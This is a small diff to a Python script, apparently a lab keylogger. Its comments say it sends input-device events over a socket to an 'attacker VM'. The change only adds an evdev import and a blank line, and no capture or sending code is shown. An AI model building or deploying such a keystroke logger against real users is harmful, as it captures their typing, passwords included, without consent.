@@ -1,4 +1,5 @@
 import socket
+import evdev
 from evdev import InputDevice, categorize, ecodes
 
 # Configura l'indirizzo IP e la porta del server di destinazione (VM attaccante)
@@ -45,5 +46,6 @@ except KeyboardInterrupt:
 finally:
     # Chiude la connessione socket
     sock.close()
+
 
 
